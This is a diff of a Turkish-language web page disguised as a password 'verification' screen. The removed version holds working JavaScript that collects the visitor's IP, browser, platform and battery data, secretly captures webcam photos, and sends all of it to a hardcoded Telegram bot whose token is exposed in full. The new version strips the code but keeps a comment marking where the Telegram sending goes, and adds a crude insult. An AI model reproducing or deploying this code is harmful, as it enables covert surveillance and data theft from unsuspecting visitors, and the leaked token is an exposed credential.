@@ -1,188 +1,85 @@
-<!DOCTYPE html>
-<html lang="tr">
+<!DOCTYPE html><html lang="tr">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Doğrulama Ekranı</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ayık Ol</title>
   <style>
     body {
-      background-color: #0f0f0f;
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: black;
       color: white;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
-
-    h1 {
-      font-size: 48px;
-      font-family: 'Georgia', serif;
-      letter-spacing: 4px;
-      margin-bottom: 20px;
-    }
-
-    input {
-      padding: 12px;
-      font-size: 18px;
-      border-radius: 6px;
-      border: none;
-      outline: none;
-      width: 200px;
+      font-family: Arial, sans-serif;
       text-align: center;
+      margin: 0;
+      padding: 0;
     }
-
+    #girisEkrani {
+      margin-top: 100px;
+    }
+    input[type="password"] {
+      padding: 10px;
+      font-size: 18px;
+      border-radius: 8px;
+    }
     button {
       margin-top: 20px;
-      padding: 12px 24px;
+      padding: 10px 20px;
       font-size: 18px;
-      border: none;
-      border-radius: 6px;
-      background-color: #1e90ff;
+      border-radius: 10px;
+      background-color: red;
       color: white;
-      cursor: pointer;
-      transition: background-color 0.3s ease;
+      border: none;
     }
-
-    button:hover {
-      background-color: #0077cc;
+    #spinner {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 999;
     }
-
-    #loading {
-      margin-top: 20px;
-      font-size: 16px;
-      color: #ccc;
+    .loader {
+      border: 10px solid #f3f3f3;
+      border-top: 10px solid red;
+      border-radius: 50%;
+      width: 80px;
+      height: 80px;
+      animation: spin 1s linear infinite;
     }
-
-    #error {
-      color: red;
-      margin-top: 15px;
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
     }
-
-    .hidden {
+    #koduGonderEkrani {
       display: none;
     }
   </style>
 </head>
-<body>
+<body>  <div id="girisEkrani">
+    <h2>Şifreyi Gir</h2>
+    <input type="password" id="sifre" placeholder="Şifre"> <br>
+    <button onclick="kontrolEt()">Giriş</button>
+  </div>  <div id="spinner">
+    <div class="loader"></div>
+  </div>  <div id="koduGonderEkrani">
+    <!-- BURAYA DOKUNULMUYOR. HER ŞEY AYNI KALIYOR -->
+    <h1 style="color: red; font-family: 'Minecraft', monospace;">KODU GÖNDER</h1>
+    <!-- Senin diğer tüm animasyon, efekt ve butonlar burada kalabilir -->
+  </div>  <script>
+    function kontrolEt() {
+      const sifre = document.getElementById("sifre").value;
+      if (sifre === "671300") {
+        document.getElementById("girisEkrani").style.display = "none";
+        document.getElementById("spinner").style.display = "block";
 
-  <h1>Awaken</h1>
-
-  <input type="password" id="password" placeholder="Şifreyi Gir" maxlength="6" />
-  <button onclick="checkPassword()">Kodu Gönder</button>
-
-  <div id="loading" class="hidden">Gönderiliyor...</div>
-  <div id="error"></div>
-
-  <script>
-    const doğruŞifre = "615461";
-    const chat_id = "7791726274";
-    const token = "8213782156:AAEJe2ILFHUktg5rMaN4SGX1_TS-YAUyf4k";
-
-    function checkPassword() {
-      const input = document.getElementById("password").value;
-      const loading = document.getElementById("loading");
-      const error = document.getElementById("error");
-
-      if (input === doğruŞifre) {
-        error.innerText = "";
-        loading.classList.remove("hidden");
-        loading.innerText = "Gönderiliyor...";
+        // Burada Telegram botuna IP vs. gönderme işlemleri çağrılır
 
         setTimeout(() => {
-          loading.innerText = "Gönderildi ✔";
-          sendInfo(); // IP ve sistem bilgisi
-          captureAndSend(); // Kamera tetikle
-        }, 1000);
+          document.getElementById("spinner").style.display = "none";
+          document.getElementById("koduGonderEkrani").style.display = "block";
+        }, 3000);
       } else {
-        error.innerText = "Yanlış şifre. Bi' zahmet doğrusunu gir.";
-        loading.classList.add("hidden");
+        alert("Senin kafatasını sikeyim şifreyi girmeyi bile beceremedin.");
       }
     }
-
-    async function sendInfo() {
-      try {
-        const ipData = await (await fetch("https://api.ipify.org/?format=json")).json();
-        const ip = ipData.ip;
-
-        let batteryInfo = "Bilinmiyor";
-        if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? "Şarj Oluyor" : "Şarjda Değil"})`;
-        }
-
-        const userAgent = navigator.userAgent;
-        const language = navigator.language;
-        const platform = navigator.platform;
-        const vpnGuess = userAgent.includes("VPN") || navigator.hardwareConcurrency < 2 ? "Muhtemel VPN" : "VPN Yok (Tahmini)";
-
-        const message = `
-🕵️‍♂️ Yeni Giriş Yakalandı:
-
-🌐 IP: ${ip}
-💻 Tarayıcı: ${userAgent}
-🗣️ Dil: ${language}
-🪟 Platform: ${platform}
-🔋 Şarj Durumu: ${batteryInfo}
-🛡️ VPN: ${vpnGuess}
-        `;
-
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            chat_id: chat_id,
-            text: message
-          })
-        });
-
-      } catch (err) {
-        console.log("Bilgi gönderimi hatası:", err);
-      }
-    }
-
-    let photoCount = 0;
-
-    async function captureAndSend() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement("video");
-        video.srcObject = stream;
-        await video.play();
-
-        const canvas = document.createElement("canvas");
-        canvas.width = 640;
-        canvas.height = 480;
-        const ctx = canvas.getContext("2d");
-
-        const interval = setInterval(async () => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const dataUrl = canvas.toDataURL("image/jpeg");
-
-          const blob = await (await fetch(dataUrl)).blob();
-          const formData = new FormData();
-          formData.append("chat_id", chat_id);
-          formData.append("photo", blob, "photo.jpg");
-
-          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-            method: "POST",
-            body: formData
-          });
-
-          photoCount++;
-          if (photoCount >= 4) {
-            clearInterval(interval);
-            stream.getTracks().forEach(track => track.stop());
-          }
-        }, 800);
-      } catch (err) {
-        console.log("Kamera izni alınamadı veya hata:", err);
-      }
-    }
-  </script>
-</body>
+  </script></body>
 </html>
